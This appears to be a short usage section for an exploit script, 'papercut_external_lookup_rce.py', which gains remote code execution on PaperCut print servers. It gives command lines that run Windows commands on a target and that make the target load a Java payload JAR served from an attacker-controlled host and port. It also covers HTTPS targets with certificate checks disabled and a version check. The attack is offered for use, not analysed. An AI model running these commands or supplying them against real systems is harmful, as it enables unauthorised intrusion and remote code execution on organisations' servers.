# pcut2026

## Windows command target
python3 papercut_external_lookup_rce.py 10.0.0.5 \
  --win-command 'whoami > C:\proof.txt'

## Java payload JAR (served over HTTP, loaded by the target)
python3 papercut_external_lookup_rce.py 192.168.1.10 \
  --jar payload.jar --lhost 192.168.1.100 --lport 8080

## Read-only version check only
python3 papercut_external_lookup_rce.py 192.168.1.10 --check -v

## HTTPS target with a self-signed cert (verification disabled by default)
python3 papercut_external_lookup_rce.py papercut.corp.local --ssl \
  --win-command 'whoami > C:\proof.txt'


# pcut2025
